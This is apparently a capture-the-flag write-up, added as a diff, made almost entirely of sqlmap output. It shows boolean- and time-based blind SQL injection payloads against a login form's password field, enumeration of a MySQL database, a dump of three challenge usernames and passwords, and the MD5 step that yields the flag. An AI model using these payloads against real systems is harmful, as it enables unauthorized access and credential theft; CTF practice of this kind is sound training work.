@@ -1,0 +1,78 @@
+[18:05:42] [INFO] (custom) POST parameter '#2*' seems to be 'MySQL >= 5.0.12 OR time-based blind' injectable 
+[18:05:42] [WARNING] in OR boolean-based injections, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+[18:05:42] [INFO] checking if the injection point on (custom) POST parameter '#2*' is a false positive
+(custom) POST parameter '#2*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 1967 HTTP(s) requests:
+---
+Parameter: #2* ((custom) POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: user=&pass=-3677' OR 6122=6122 AND 'WKzQ'='WKzQ
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: user=&pass=' OR SLEEP(5) AND 'LRql'='LRql
+---
+[18:06:09] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx
+back-end DBMS: MySQL 5.0.12
+[18:06:09] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[18:06:09] [INFO] fetching current database
+[18:06:09] [INFO] retrieving the length of query output
+[18:06:09] [INFO] retrieved: 14
+[18:06:18] [INFO] retrieved: camscsco_web15             
+[18:06:18] [INFO] fetching tables for database: 'camscsco_web15'
+[18:06:18] [INFO] fetching number of tables for database 'camscsco_web15'
+[18:06:18] [INFO] retrieved: 1
+[18:06:20] [INFO] retrieving the length of query output
+[18:06:20] [INFO] retrieved: 6
+[18:06:24] [INFO] retrieved: login3           
+[18:06:24] [INFO] fetching columns for table 'login3' in database 'camscsco_web15'
+[18:06:24] [INFO] retrieved: 2
+[18:06:26] [INFO] retrieving the length of query output
+[18:06:26] [INFO] retrieved: 7
+[18:06:32] [INFO] retrieved: usuario           
+[18:06:32] [INFO] retrieving the length of query output
+[18:06:32] [INFO] retrieved: 5
+[18:06:38] [INFO] retrieved: meowz           
+[18:06:38] [INFO] fetching entries for table 'login3' in database 'camscsco_web15'
+[18:06:38] [INFO] fetching number of entries for table 'login3' in database 'camscsco_web15'
+[18:06:38] [INFO] retrieved: 3
+[18:06:39] [INFO] retrieving the length of query output
+[18:06:39] [INFO] retrieved: 11
+[18:06:47] [INFO] retrieved: 2gRD3f4sfWf             
+[18:06:47] [INFO] retrieving the length of query output
+[18:06:47] [INFO] retrieved: 7
+[18:06:53] [INFO] retrieved: support           
+[18:06:53] [INFO] retrieving the length of query output
+[18:06:53] [INFO] retrieved: 11
+[18:07:06] [INFO] retrieved: B8zPAkFQYN4             
+[18:07:06] [INFO] retrieving the length of query output
+[18:07:06] [INFO] retrieved: 23
+[18:07:31] [INFO] retrieved: iamjustsendingthisleter             
+[18:07:31] [INFO] retrieving the length of query output
+[18:07:31] [INFO] retrieved: 11
+[18:08:02] [INFO] retrieved: S3Ysfu4xKxU             
+[18:08:02] [INFO] retrieving the length of query output
+[18:08:02] [INFO] retrieved: 5
+[18:08:18] [INFO] retrieved: bobby           
+[18:08:18] [INFO] analyzing table dump for possible password hashes
+Database: camscsco_web15
+Table: login3
+[3 entries]
++-------------+-------------------------+
+| meowz       | usuario                 |
++-------------+-------------------------+
+| 2gRD3f4sfWf | support                 |
+| B8zPAkFQYN4 | iamjustsendingthisleter |
+| S3Ysfu4xKxU | bobby                   |
++-------------+-------------------------+
+
+
+Log in as anyone, you get a page that asks for the MD5 of the concatenation of all the passwords:
+
+md5(S3Ysfu4xKxUB8zPAkFQYN42gRD3f4sfWf) => 322d54af6552d87dfc0a473cb2926144
+
+Flag: #dying_fr0m_sql
+
+
